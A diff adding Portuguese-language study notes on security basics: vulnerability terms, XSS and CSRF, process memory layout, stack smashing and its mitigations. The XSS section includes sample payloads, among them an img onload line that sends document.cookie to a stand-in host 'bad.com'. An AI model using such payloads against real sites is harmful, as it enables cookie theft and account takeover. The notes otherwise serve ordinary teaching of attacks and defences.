@@ -1,0 +1,60 @@
+VULNERABILITIES
+zero-day: quando só descobres a vulnerabilidade e começas a descobrir como resolver no momento que acontece o ataque
+cve: vulnerabilidades e exposições comuns
+cert: organização que garante o uso de de tecnologia e sistemas apropriados
+csirt: organização responsável por receber, rever e responder a incidentes de segurança computacional
+
+XSS
+xss: injeção de scripts em webpages pelos clientes do mesmo
+
+alert: <img src=‘img.png’> </img> -- (xss) -- <img src=‘img.png’> <script> alert(“hi”); </script> </img>
+roubar cookies: <img src=“img.png” onload=“window.open(‘http://bad.com/reg.php?’+document.cookie)” > </img> 
+Pode ser inserido:
+ junto de texto (<p>Hi there<script>alert(‘hehe’)</script></p>)
+ em media tags (<img src=“http://bank.com/delete_account.php”></img>)
+ em urls (http://foo.bar/index.php?search=<script>alert(‘hi’)</script>)
+
+stored xss: a página já está guardada no web server com o script malicioso, previamente colocado pelo hacker
+
+reflected xss: o cliente abre a página através de um link malicioso, com um script embutido no link
+
+cross-site request forgery (csrf): a pagina ja está guardada no webserver com o script E 
+				o script ao ser executado faz um request a outro site (ex: banco)
+
+BUFFER OVERFLOWS
+kernel organiza a memória em páginas, tipicamente de 4kB
+processos correm em um espaço de memória virtual, mapeado para 4k páginas reais
+páginas podem ser agrupadas para dar mais segurança (read-only, read-write) 
+	ou para dar mais performance (dynamic (apagado no fim), static (mantem permitindo ser reutilizado))
+
+estrutura:
+ Text (código do programa, constantes globais (ReadOnly))
+ Data (variaveis globais inicializadas)
+ BSS (variaveis globais não inicializadas)
+ Heap (dados dinamicos sem variaveis)
+		|
+		v
+ Shared libraries (código de libraries e suas variaveis globais (pode ser ReadOnly))
+		^
+		|
+ Stack (parametros de funções, variaveis locais)
+
+base pointer: adress base da stack frame da função (stack frame tem os parametros e as variaveis locais da função)
+stack pointer: aponta para o fim da stack (ultimo valor que levou push)
+instruction pointer: aponta para a instrução atual
+dizem-se EBP, ESP e EIP caso sejam registos de 32bits
+stack é invertida, sendo que para pegar em variaveis locais teria de se fazer base pointer - 8 por exemplo
+
+problemas de buffer overflow:
+ escrever por cima de valores armazenados ao lado do buffer
+ escrever por cima de saved registers como saved ip (return adress) ou saved bp (base address do stack frame anterior)
+
+stack smashing attack: dar overflow a uma variavel local até ao return adress e mudá-lo para ele dar jump para o 
+		injected data com código executavel (o atacante precisa de saber o adress absoluto da variavel vulneravel)
+mitigation/prevention: impedir a execução de instruções em segmentos/páginas que normalmente não têm código
+		       randomize o espaço de endereços para o segmento nao ficar em posiçoes fixas em varias execuçoes
+				(previne saltos para locais de codigo conhecidos / os segumentos mantêm a sua posiçao relativa)
+		       reordenação de variaveis porque as mais vulneraveis sao arrays, entao para proteger as outras variaveis locais,
+				colocasse os arrays perto dos saved registers
+		       canary é um valor desconhecido colocado ao lado dos saved registers, que as funçoes vao verificar se foi mudado
+				antes de irem buscar o return address aos saved registers
